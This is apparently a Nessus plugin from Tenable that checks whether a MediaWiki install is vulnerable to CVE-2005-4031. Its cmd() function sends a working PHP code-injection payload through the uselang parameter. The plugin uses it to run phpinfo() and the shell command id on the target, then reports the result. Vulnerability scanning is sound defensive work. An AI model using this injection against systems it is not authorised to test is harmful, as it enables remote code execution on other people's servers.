#
# (C) Tenable Network Security
#

 desc["english"] = "
Synopsis :

The remote web server contains a set of PHP scripts which may allow
an attacker to execute arbitrary commands the remote host.

Description :

The remote host appears to be running a version of MediaWiki 1.5 older 
than version 1.5.3.  Due to a bad sanitizing of user-supplied variables,
the remote version of this software is vulnerable to a code execution 
vulnerability which may allow an attacker to execute arbitrary PHP and
shell commands on the remote host.

See also : 

http://sourceforge.net/project/shownotes.php?group_id=34373&release_id=375755
http://www.mediawiki.org/wiki/Download#Stable

Solution: 

Upgrade to MediaWiki 1.5.3 or later.

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:N/I:C/A:N/B:N)";

if(description) {
 script_id(20255);
 script_cve_id("CVE-2005-4031");
 script_bugtraq_id(15703);
 script_version("$Revision: 1.5 $");

 
 script_name(english:"MediaWiki Multiple Remote Vulnerabilities (2)");

 script_description(english:desc["english"]);
 script_summary(english:"Attempts to execute phpinfo() remotely");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 script_dependencies("mediawiki_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


function cmd(loc, cmd)
{
 local_var req, res, cmd;
  req = http_get(item:loc + urlencode(unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/?=", 
str: '/index.php?uselang=tns extends LanguageUtf8 {
function getVariants() {
	return 0;
 }
}
'+ cmd + '
class foobar'), port:port);
  
  res = http_keepalive_send_recv(port:port, data:req);
  return res;
}

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);



# Test an install.
install = get_kb_item(string("www/", port, "/mediawiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches)) {
  loc = matches[2];
  res = cmd(cmd:"phpinfo();", loc:loc);
  if ( "<title>phpinfo()</title>" >< res ) 
   {
     # Unix only 
     res = egrep(pattern:"uid=[0-9].*gid=[0-9].*", string:cmd(cmd:'echo `id`;', loc:loc));
     if ( res ) 
	{
	 desc["english"] += "

Plugin output :

It was possible to execute the 'id' command, which produces the following result :

" + res;
	}

     security_note(port:port, data:desc["english"]);
   }


}
